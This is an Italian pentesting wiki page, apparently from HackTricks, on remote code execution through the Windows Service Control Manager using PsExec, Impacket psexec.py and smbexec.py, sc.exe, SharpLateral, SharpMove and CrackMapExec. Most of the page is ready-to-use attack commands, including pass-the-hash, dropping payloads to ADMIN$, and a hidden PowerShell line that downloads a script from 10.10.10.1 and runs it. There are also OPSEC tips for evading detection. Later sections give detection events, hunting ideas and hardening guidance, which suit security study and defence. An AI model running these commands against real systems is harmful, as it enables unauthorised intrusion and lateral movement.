# PsExec/Winexec/ScExec/SMBExec

{{#include ../../banners/hacktricks-training.md}}

## Come funzionano

Queste tecniche abusano del Windows Service Control Manager (SCM) in remoto tramite SMB/RPC per eseguire comandi su un host target. Il flusso comune è:

1. Autenticarsi al target e accedere alla share ADMIN$ tramite SMB (TCP/445).
2. Copiare un eseguibile o specificare una command line LOLBAS che il servizio eseguirà.
3. Creare un servizio in remoto tramite SCM (MS-SCMR su \PIPE\svcctl) indicando quel comando o binario.
4. Avviare il servizio per eseguire il payload e, opzionalmente, acquisire stdin/stdout tramite una named pipe.
5. Arrestare il servizio ed eseguire la pulizia (eliminare il servizio e gli eventuali binari copiati).

Requisiti/prerequisiti:
- Local Administrator sul target (SeCreateServicePrivilege) o diritti espliciti per la creazione di servizi sul target.
- SMB (445) raggiungibile e share ADMIN$ disponibile; Remote Service Management consentito tramite il firewall dell'host.
- UAC Remote Restrictions: con gli account locali, il token filtering può bloccare l'amministratore sulla rete, a meno che non si utilizzi l'account built-in Administrator o LocalAccountTokenFilterPolicy=1.
- Kerberos vs NTLM: l'utilizzo di un hostname/FQDN abilita Kerberos; la connessione tramite IP spesso ricade su NTLM (e potrebbe essere bloccata in ambienti sottoposti a hardening).

### ScExec/WinExec manuale tramite sc.exe

Quanto segue mostra un approccio minimale alla creazione di un servizio. L'immagine del servizio può essere un EXE copiato sul sistema o un LOLBAS come cmd.exe o powershell.exe.
```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```
Note:
- Aspettati un errore di timeout quando avvii un EXE non-service; l'esecuzione avviene comunque.
- Per rimanere più OPSEC-friendly, preferisci comandi fileless (`cmd /c`, `powershell -enc`) oppure elimina gli artifact rilasciati.

Trova i passaggi più dettagliati in: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Tooling ed esempi

### Sysinternals PsExec.exe

- Strumento admin classico che utilizza SMB per rilasciare PSEXESVC.exe in ADMIN$, installa un servizio temporaneo (nome predefinito PSEXESVC) e fa da proxy per l'I/O tramite named pipe.
- Esempi di utilizzo:<sup>[[1]](#references)</sup>
```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```
- Puoi eseguire direttamente da Sysinternals Live tramite WebDAV:
```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```
OPSEC
- Lascia eventi di installazione/disinstallazione del servizio (il nome del servizio è spesso PSEXESVC, a meno che non venga usato -r) e crea C:\Windows\PSEXESVC.exe durante l'esecuzione.

### Impacket psexec.py (PsExec-like)

- Usa un servizio embedded simile a RemCom. Scarica un service binary temporaneo (con un nome comunemente randomizzato) tramite ADMIN$, crea un servizio (spesso RemComSvc per impostazione predefinita) e fa da proxy per l'I/O tramite una named pipe.
```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```
Artefatti
- EXE temporaneo in C:\Windows\ (8 caratteri casuali). Il nome del servizio è RemComSvc per impostazione predefinita, salvo override.

### Impacket smbexec.py (SMBExec)

- Crea un servizio temporaneo che avvia cmd.exe e utilizza una named pipe per l'I/O. In genere evita di depositare un payload EXE completo; l'esecuzione dei comandi è semi-interattiva.
```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```
### SharpLateral e SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implementa diversi metodi di lateral movement, incluso service-based exec.
```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```
- [SharpMove](https://github.com/0xthirteen/SharpMove) include la modifica/creazione di servizi per eseguire un comando da remoto.
```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```
- Puoi anche usare CrackMapExec per eseguire tramite diversi backend (psexec/smbexec/wmiexec):
```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```
## OPSEC, rilevamento e artefatti

Artefatti tipici sull'host e sulla rete quando si utilizzano tecniche simili a PsExec:
- Security 4624 (Logon Type 3) e 4672 (Special Privileges) sul target per l'account admin utilizzato.
- Eventi Security 5140/5145 File Share e File Share Detailed che mostrano l'accesso ad ADMIN$ e la creazione/scrittura di service binaries (ad es. PSEXESVC.exe o un file .exe casuale di 8 caratteri).
- Security 7045 Service Install sul target: nomi dei servizi come PSEXESVC, RemComSvc o personalizzati (-r / -service-name).
- Sysmon 1 (Process Create) per services.exe o per l'immagine del servizio, 3 (Network Connect), 11 (File Create) in C:\Windows\, 17/18 (Pipe Created/Connected) per pipe come \\.\pipe\psexesvc, \\.\pipe\remcom_* o equivalenti randomizzati.
- Artefatto nel Registry per l'EULA di Sysinternals: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 sull'host dell'operatore (se non soppresso).

Idee per l'hunting
- Generare un alert sulle installazioni di servizi in cui ImagePath include cmd.exe /c, powershell.exe o percorsi TEMP.
- Cercare process creations in cui ParentImage è C:\Windows\PSEXESVC.exe o processi figli di services.exe eseguiti come LOCAL SYSTEM che avviano shell.
- Segnalare named pipes che terminano con -stdin/-stdout/-stderr o con nomi di pipe noti dei cloni di PsExec.

## Risoluzione dei problemi più comuni
- Access is denied (5) durante la creazione dei servizi: l'utente non è realmente local admin, sono presenti restrizioni UAC remote per gli account locali oppure la protezione anti-tampering dell'EDR sul percorso del service binary impedisce l'operazione.
- The network path was not found (53) o impossibilità di connettersi ad ADMIN$: firewall che blocca SMB/RPC oppure admin shares disabilitate.
- Kerberos non funziona ma NTLM è bloccato: connettersi utilizzando hostname/FQDN (non l'indirizzo IP), verificare gli SPN corretti oppure fornire -k/-no-pass con i ticket quando si utilizza Impacket.
- Il timeout dell'avvio del servizio si verifica ma il payload è stato eseguito: comportamento previsto se non si tratta di un vero service binary; salvare l'output in un file oppure utilizzare smbexec per l'I/O in tempo reale.

## Note sull'hardening
- Windows 11 24H2 e Windows Server 2025 richiedono SMB signing per impostazione predefinita per le connessioni in uscita (e in ingresso per Windows 11). Questo non interrompe l'uso legittimo di PsExec con credenziali valide, ma impedisce gli abusi di SMB relay senza firma e può avere impatto sui dispositivi che non supportano la firma.<sup>[[2]](#references)</sup>
- Il nuovo blocco NTLM del client SMB (Windows 11 24H2/Server 2025) può impedire il fallback a NTLM durante la connessione tramite IP o verso server non Kerberos. Negli ambienti hardened questo interromperà PsExec/SMBExec basati su NTLM; utilizzare Kerberos (hostname/FQDN) oppure configurare eccezioni se realmente necessario.<sup>[[2]](#references)</sup>
- Principio del privilegio minimo: ridurre al minimo la presenza negli account local admin, preferire Just-in-Time/Just-Enough Admin, applicare LAPS e monitorare/generare alert sulle installazioni di servizi 7045.

## Vedi anche

- Remote exec basato su WMI (spesso più fileless):

{{#ref}}
./wmiexec.md
{{#endref}}

- Remote exec basato su WinRM:

{{#ref}}
./winrm.md
{{#endref}}

## Riferimenti

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [SMB security hardening in Windows Server 2025 & Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Using Credentials to Own Windows Boxes - Part 2 (PSExec and Services)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)

{{#include ../../banners/hacktricks-training.md}}
